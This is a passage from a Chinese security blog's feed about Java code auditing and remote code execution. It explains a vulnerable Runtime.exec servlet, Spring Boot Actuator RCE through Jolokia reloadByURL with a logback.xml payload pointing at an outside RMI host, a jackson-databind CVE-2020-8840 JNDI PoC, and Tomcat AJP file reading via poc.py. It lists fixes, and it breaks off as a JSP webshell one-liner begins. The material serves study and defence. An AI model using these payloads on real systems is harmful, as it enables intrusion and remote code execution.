target="_blank" rel="noopener">https://www.liangzl.com/get-article-detail-138970.html</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355</a><br><a href="https://paper.seebug.org/1107/#41" target="_blank" rel="noopener">https://paper.seebug.org/1107/#41</a><br><a href="https://ackcent.com/blog/in-depth-freemarker-template-injection/" target="_blank" rel="noopener">https://ackcent.com/blog/in-depth-freemarker-template-injection/</a><br><a href="https://www.cnblogs.com/wade-luffy/p/5996848.html" target="_blank" rel="noopener">https://www.cnblogs.com/wade-luffy/p/5996848.html</a><br><a href="https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html" target="_blank" rel="noopener">https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html</a><br><a href="https://blog.csdn.net/weixin_38964895/article/details/81381060" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38964895/article/details/81381060</a><br><a href="https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;为什么说Java审计南在SSTI呢？&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;现行SSTI(Server-Side Te
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java SSTI" scheme="http://yoursite.com/tags/Java-SSTI/"/>
    
  </entry>
  
  <entry>
    <title>春眠不觉晓，RCE知多少？</title>
    <link href="http://yoursite.com/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>http://yoursite.com/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-03-03T04:42:16.000Z</published>
    <updated>2020-03-03T04:57:16.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>读者受众：所有人</li><li>阅读要求：30mins</li><li>文章中2620还没写完，清水川崎大佬就爆2634了，据说他还藏了很多个0day</li></ul><p><img src="https://img-blog.csdnimg.cn/20200303122905453.png" alt="在这里插入图片描述"></p><hr><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简单案例分析RCE"><a href="#简单案例分析RCE" class="headerlink" title="简单案例分析RCE"></a>简单案例分析RCE</h2><p><img src="https://img-blog.csdnimg.cn/20200215130716340.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 通过Java执行系统命令，与cmd中或者终端上一样执行shell命令，最典型的用法就是使用Runtime.getRuntime().exec(command)或者new ProcessBuilder(cmdArray).start()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">CommandExec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">"cmd"</span>).toString();</span><br><span class="line">        Runtime run = Runtime.getRuntime();</span><br><span class="line">        String lineStr = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = run.exec(cmd);</span><br><span class="line">            BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                lineStr += tmpStr + <span class="string">"\n"</span>;</span><br><span class="line">                System.out.println(tmpStr);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>漏洞成因分析</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始获取cmd参数值</span><br><span class="line">e&#x3D;&gt;end: 输出返回值</span><br><span class="line">op1&#x3D;&gt;operation: 执行命令（过程类似Runtime.getRuntime().exec(command)）</span><br><span class="line">st-&gt;op1-&gt;e</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 流程图显示的代码执行的过程，不难发现我们没有看到过滤参数，判断参数是否输入正确的一系列操作，从而导致的<code>命令执行漏洞</code>。</p><p><strong>说明：</strong></p><ol><li>process指向一个本地进程，相对于main进程来说，process指向的称为子进程。<a href="https://blog.csdn.net/dataiyangu/article/details/83988654" target="_blank" rel="noopener">^1</a></li><li>BufferedInputStream 是缓冲输入流，它继承FilterInputStream类。BufferedInputStream 的作用是为另一个输入流添加一些功能，例如，提供“缓冲功能”以及支持“mark()标记”和“reset()重置方法”。BufferedInputStream 本质上是通过一个内部缓冲区数组实现的。例如，在新建某输入流对应的BufferedInputStream后，当我们通过read()读取输入流的数据时，BufferedInputStream会将该输入流的数据分批的填入到缓冲区中。每当缓冲区中的数据被读完之后，输入流会再次填充数据缓冲区；如此反复，直到我们读完输入流数据位置。[^2]</li></ol><hr><h2 id="知识内容补充"><a href="#知识内容补充" class="headerlink" title="知识内容补充"></a>知识内容补充</h2><p> <strong>继续阅读下面的内容，你需要补充更多知识。</strong></p><ol><li>Java序列化和反序列化</li><li>RMI、JRMP、JMX、JNDI</li><li>JNDI注入原理</li></ol><p>笔者在此，做一个简单介绍。</p><ul><li>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于Socket传输。 在RMI(Java远程方法调用-Java Remote Method Invocation)和JMX(Java管理扩展-Java Management Extensions)服务中对象反序列化机制被强制性使用。在Http请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</li><li>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。</li><li>JRMP（ Java Remote Method Protocol）协议通信，用于规范远程方法调用的协议</li><li>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</li><li>关于JNDI注入百度有很多文章，推荐<a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a>、<a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入原理及利用</a></li></ul><p><strong>推荐文章：</strong></p><ul><li><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">Java 序列化/反序列化</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li><li><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">搞懂RMI、JRMP、JNDI-终结篇</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">MicroFocus研究论文(纯英文)</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></li></ul><hr><h2 id="Spring-Boot-Actuators-to-RCE"><a href="#Spring-Boot-Actuators-to-RCE" class="headerlink" title="Spring Boot Actuators to RCE"></a>Spring Boot Actuators to RCE</h2><p>&emsp;&emsp; Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。</p><p>&emsp;&emsp; 使用老外提供的源码，用mvn编译运行。<a href="https://github.com/veracode-research/actuator-testbed" target="_blank" rel="noopener">GitHub项目地址</a>直接访问<code>http://127.0.0.1:8090/jolokia/list</code><br>或者修改ip和端口<code>actuator-testbed\src\main\resources\application.properties</code></p><p><img src="https://img-blog.csdnimg.cn/20200225152718508.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225152401453.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228131827582.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 上面的<code>reloadByURL</code>可以加载一个外部URL进而重新加载日志配置，结果造成了RCE。我们需要构造一个恶意logback.xml的URL。<br><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//下面是logback.xml内容</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"rmi://artsploit.com:1389/jndi"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>rmi和ldap服务都能触发这个漏洞，笔者在这里选择rmi服务。</p><p><img src="https://img-blog.csdnimg.cn/20200227143151844.gif" alt="在这里插入图片描述"><br><strong>简单的触发流程流程图：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: Spring-boot-actuator</span><br><span class="line">e&#x3D;&gt;end: RCE</span><br><span class="line">op&#x3D;&gt;operation: Jolokia</span><br><span class="line">op2&#x3D;&gt;operation: RMI</span><br><span class="line">cond&#x3D;&gt;condition: logback.xml?</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;op2-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op2</span><br></pre></td></tr></table></figure><hr><p><strong>源码分析</strong></p><ol><li>第一步会先注册jolokia<br><img src="https://img-blog.csdnimg.cn/20200229132647972.png#pic_center" alt="在这里插入图片描述"></li><li><a href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml" target="_blank" rel="noopener">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</a><br>看上面URL分析<code>reloadByURL</code>很重要，看一下源码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reloadByURL</span><span class="params">(URL url)</span> <span class="keyword">throws</span> JoranException </span>&#123;</span><br><span class="line">       StatusListenerAsList statusListenerAsList = <span class="keyword">new</span> StatusListenerAsList();</span><br><span class="line"></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line">       addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">       loggerContext.reset();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// after a reset the statusListenerAsList gets removed as a listener</span></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (url != <span class="keyword">null</span>) &#123;</span><br><span class="line">               JoranConfigurator configurator = <span class="keyword">new</span> JoranConfigurator();</span><br><span class="line">               configurator.setContext(loggerContext);</span><br><span class="line">               configurator.doConfigure(url);</span><br><span class="line">               addInfo(<span class="string">"Context: "</span> + loggerContext.getName() + <span class="string">" reloaded."</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           removeStatusListener(statusListenerAsList);</span><br><span class="line">           <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">               StatusPrinter.print(statusListenerAsList.getStatusList());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>不难发现下面三行代码是关键，重置日志配置。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addStatusListener(statusListenerAsList);</span><br><span class="line">      addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">      loggerContext.reset();</span><br></pre></td></tr></table></figure></li></ol><p><strong>推荐文章</strong></p><p><a href="https://xz.aliyun.com/t/4258" target="_blank" rel="noopener">spring boot actuator rce via jolokia</a><br><a href="https://www.anquanke.com/post/id/173265" target="_blank" rel="noopener">Attack Spring Boot Actuator via jolokia Part 2</a><a href="https://xz.aliyun.com/t/4259" target="_blank" rel="noopener">关于此漏洞更多的骚操作参考</a></p><hr><p><strong>代码审计关键词</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">trace</span><br><span class="line">health</span><br><span class="line">loggers</span><br><span class="line">metrics</span><br><span class="line">autoconfig</span><br><span class="line">heapdump</span><br><span class="line">threaddump</span><br><span class="line">env</span><br><span class="line">info</span><br><span class="line">dump</span><br><span class="line">configprops</span><br><span class="line">mappings</span><br><span class="line">auditevents</span><br><span class="line">beans</span><br><span class="line">jolokia</span><br><span class="line">cloudfoundryapplication</span><br><span class="line">hystrix.stream</span><br><span class="line">actuator</span><br><span class="line">actuator&#x2F;auditevents</span><br><span class="line">actuator&#x2F;beans</span><br><span class="line">actuator&#x2F;health</span><br><span class="line">actuator&#x2F;conditions</span><br><span class="line">actuator&#x2F;configprops</span><br><span class="line">actuator&#x2F;env</span><br><span class="line">actuator&#x2F;info</span><br><span class="line">actuator&#x2F;loggers</span><br><span class="line">actuator&#x2F;heapdump</span><br><span class="line">actuator&#x2F;threaddump</span><br><span class="line">actuator&#x2F;metrics</span><br><span class="line">actuator&#x2F;scheduledtasks</span><br><span class="line">actuator&#x2F;httptrace</span><br><span class="line">actuator&#x2F;mappings</span><br><span class="line">actuator&#x2F;jolokia</span><br><span class="line">actuator&#x2F;hystrix.stream</span><br></pre></td></tr></table></figure><hr><p><strong>防护措施</strong><br>&emsp;&emsp; 在使用Actuator时，不正确的使用或者一些不经意的疏忽，就会造成严重的信息泄露等安全隐患。在代码审计时如果是springboot项目并且遇到actuator依赖，则有必要对安全依赖及配置进行复查。也可作为一条规则添加到黑盒扫描器中进一步把控。<br>&emsp;&emsp; 安全的做法是一定要引入security依赖，打开安全限制并进行身份验证。同时设置单独的Actuator管理端口并配置不对外网开放。<br>更多防护措施参考<a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">SpringBoot应用监控Actuator使用的安全隐患</a></p><hr><h2 id="CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞"><a href="#CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞" class="headerlink" title="CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞"></a>CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞</h2><p><strong>&emsp;&emsp; FasterXML/jackson-databind是一个用于JSON和对象转换的Java第三方库，可将Java对象转换成json对象和xml文档，同样也可将json对象转换成Java对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞POC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227143135510.gif" alt="在这里插入图片描述"></p><hr><p>我们查看官方的漏洞源码提交修复记录<a href="https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497" target="_blank" rel="noopener">GitHub地址</a>分析。<br><img src="https://img-blog.csdnimg.cn/20200302161840124.png" alt="在这里插入图片描述"></p><ul><li>查看POC ，找到JndiConverter类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\",&#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302190911380.png" alt="在这里插入图片描述"></li><li>查看类的继承关系，找到AbstractConverter类</li></ul><p><img src="https://img-blog.csdnimg.cn/20200302191128920.png#pic_center" alt="在这里插入图片描述"></p><ul><li>找到toObject方法，证据不足，继续溯源。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">toObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.toObjectImpl(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>证据充分，此是内奸。重置text内容导致RCE。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setAsText</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.toObject(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">        <span class="keyword">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302192146603.png" alt="在这里插入图片描述"></li></ul><hr><p><strong>思路整理</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始</span><br><span class="line">e1&#x3D;&gt;end: 结束</span><br><span class="line">e2&#x3D;&gt;end: RCE</span><br><span class="line">op1&#x3D;&gt;operation: POC字符串</span><br><span class="line">op2&#x3D;&gt;operation: JndiConverter-&gt;toObjectImpl方法</span><br><span class="line">op3&#x3D;&gt;operation: AbstractConverter-&gt;setAsText方法</span><br><span class="line">op4&#x3D;&gt;operation: 请求ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit</span><br><span class="line">op5&#x3D;&gt;operation: Send LDAP reference result for Exploit redirecting to http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">op6&#x3D;&gt;operation: http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">cond&#x3D;&gt;condition: RCE？</span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;cond-&gt;op4-&gt;op5-&gt;op6-&gt;e2</span><br><span class="line">cond(yes)-&gt;op4</span><br><span class="line">cond(no)-&gt;e1</span><br></pre></td></tr></table></figure><hr><p><strong>修复方式</strong><br>4. 升级 jackson-databind 至2.9.10.3、2.8.11.5、2.10.x<br>5. 排查项目中是否使用 xbean-reflect。该次漏洞的核心原因是xbean-reflect 中存在特殊的利用链允许用户触发 JNDI 远程类加载操作。将xbean-reflect移除可以缓解漏洞所带来的影响。</p><hr><h1 id="推荐几个历史版本RCE"><a href="#推荐几个历史版本RCE" class="headerlink" title="推荐几个历史版本RCE"></a>推荐几个历史版本RCE</h1><ol><li>com.threedr3am.bug.fastjson.FastjsonSerialize(TemplatesImpl) 利用条件：fastjson &lt;= 1.2.24 + Feature.SupportNonPublicField</li><li>com.threedr3am.bug.fastjson.NoNeedAutoTypePoc 利用条件：fastjson &lt; 1.2.48 不需要任何配置，默认配置通杀RCE</li><li>com.threedr3am.bug.fastjson.HikariConfigPoc(HikariConfig) 利用条件：fastjson &lt;= 1.2.59 RCE，需要开启AutoType</li><li>com.threedr3am.bug.fastjson.CommonsProxyPoc(SessionBeanProvider) 利用条件：fastjson &lt;= 1.2.61 RCE，需要开启AutoType</li><li>cas-4.1.x~4.1.6 反序列化漏洞（利用默认密钥）</li><li>cas-4.1.7~4.2.x 反序列化漏洞（需要知道加密key和签名key）</li></ol><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/JoyChou93/java-sec-code/wiki" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki</a><br><a href="http://www.jianfensec.com/70.html" target="_blank" rel="noopener">http://www.jianfensec.com/70.html</a><br><a href="https://www.cnblogs.com/tr1ple/p/12348886.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/12348886.html</a><br>[^2]: <a href="https://www.cnblogs.com/isme-zjh/p/11506495.html" target="_blank" rel="noopener">https://www.cnblogs.com/isme-zjh/p/11506495.html</a><br><a href="https://github.com/jas502n/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-8840</a><br><a href="https://github.com/fairyming/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/fairyming/CVE-2020-8840</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;读者受众：所有人&lt;/li&gt;
&lt;li&gt;阅读要求：30mins&lt;/li&gt;
&lt;li&gt;文章中2620还没写完，清水川崎大佬就爆2634了
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="JavaRCE" scheme="http://yoursite.com/tags/JavaRCE/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞</title>
    <link href="http://yoursite.com/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-02-23T07:33:25.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p><hr><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><ul><li>Apache Tomcat 6 </li><li>Apache Tomcat 7 &lt; 7.0.100 </li><li>Apache Tomcat 8 &lt; 8.5.51 </li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp; 之前代码审计的时候安装了apache tomcat/9.0.29还存在这个漏洞，所以索性复现一下漏洞。这里环境搭建很简单，去官方网站下载tomcat下载安装就好了，不会随便百度一篇文章看看，笔者这里就不多说什么了。</p><p><img src="https://img-blog.csdnimg.cn/20200221193023649.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><code>python poc.py -p 8009 -f &quot;/WEB-INF/web.xml&quot; 127.0.0.1</code><img src="https://img-blog.csdnimg.cn/20200221193441663.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221193330182.jpg" alt="在这里插入图片描述"></p><hr><h1 id="骚操作-RCE"><a href="#骚操作-RCE" class="headerlink" title="骚操作 RCE"></a>骚操作 RCE</h1><p>&emsp;&emsp; 利用大佬hero0修改poc脚本，修改成了python3版本。<br>增加了 –rce选项，会使用jsp渲染执行文本中包含的命令，默认读取文件模式。<br>可以配合上传漏洞进行漏洞利用。<br>命令执行一句话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(new 